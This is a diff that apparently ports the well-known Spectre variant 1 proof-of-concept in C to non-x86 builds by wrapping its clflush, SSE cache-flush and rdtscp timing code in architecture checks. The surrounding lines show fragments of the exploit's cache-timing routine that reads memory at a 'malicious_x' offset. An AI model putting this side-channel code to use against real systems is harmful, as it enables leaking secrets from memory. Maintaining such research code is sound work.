@@ -17,7 +17,7 @@
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtsc, rdtscp, clflush */
 #pragma optimize("gt",on)
-#else
+#elif defined(__x86_64__)
 #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
 #endif /* ifdef _MSC_VER */
 
@@ -118,6 +118,7 @@ void victim_function(size_t x) {
 Analysis code
 ********************************************************************/
 #ifdef NOCLFLUSH
+#if !defined(__aarch64__)
 #define CACHE_FLUSH_ITERATIONS 2048
 #define CACHE_FLUSH_STRIDE 4096
 uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];
@@ -136,6 +137,7 @@ void flush_memory_sse(uint8_t * addr)
       _mm_stream_ps(&p[(l * 4 + k) * 4], i);
 }
 #endif
+#endif
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
@@ -146,7 +148,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
   register uint64_t time1, time2;
   volatile uint8_t * addr;
 
-#ifdef NOCLFLUSH
+#if defined(NOCLFLUSH) && defined(__x86_64__)
   int junk2 = 0;
   int l;
   (void)junk2;
@@ -160,7 +162,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     /* Flush array2[512*(0..255)] from cache */
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
-#else
+#elif defined(__x86_64__)
     /* Flush array2[256*(0..255)] from cache
        using long SSE instruction several times */
     for (j = 0; j < 16; j++)
@@ -173,7 +175,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     for (j = 29; j >= 0; j--) {
 #ifndef NOCLFLUSH
       _mm_clflush( & array1_size);
-#else
+#elif defined(__x86_64__)
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
          Do this around 2000 times, or more depending on CPU cache size. */
@@ -214,7 +216,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       time1 = __rdtscp( & junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-#else
+#elif defined(__x86_64__)
 
     /*
     The rdtscp instruction was instroduced with the x86-64 extensions.
@@ -297,7 +299,7 @@ int main(int argc,
   uint8_t value[2];
   int i;
 
-  #ifdef NOCLFLUSH
+  #if defined(NOCLFLUSH) && defined(__x86_64__)
   for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
     cache_flush_array[i] = 1;
   }
